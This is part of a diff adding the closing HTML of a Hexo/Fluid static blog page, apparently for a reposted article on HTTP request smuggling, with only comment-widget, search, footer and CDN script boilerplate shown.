+        this.page.url = 'https://greydr34d.github.io/2019/10/19/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E5%8D%8F%E8%AE%AE%E5%B1%82%E7%9A%84%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/';
+        this.page.identifier = '/2019/10/19/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E5%8D%8F%E8%AE%AE%E5%B1%82%E7%9A%84%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/';
+      };
+      Fluid.utils.waitElementVisible('disqus_thread', function () {
+        var d = document, s = d.createElement('script');
+        s.src = '//' + '' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', new Date());
+        (d.head || d.body).appendChild(s);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="nofollow noopener noopener">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
